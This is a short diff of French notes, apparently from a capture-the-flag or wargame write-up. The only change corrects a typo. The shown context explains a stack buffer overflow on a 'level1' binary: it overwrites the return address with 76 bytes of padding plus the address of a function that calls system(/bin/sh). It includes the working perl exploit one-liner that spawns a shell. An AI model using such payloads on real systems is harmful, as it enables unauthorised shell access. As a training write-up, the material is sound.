@@ -15,7 +15,7 @@ l'adresse de run dans objddump : 08048444 => little 44 84 04 08
 
 on peut remarquer qu il y l'appelle system(/bin/sh)
 
-donc on doit juste garder ouvert les inputs STDIN et STDOU avec un cat -
+donc on doit juste garder ouvert les inputs STDIN et STDOUT avec un cat -
 
 (perl -e 'print "A"x76,"\x44\x84\x04\x08"' ; cat -) | ./level1
 
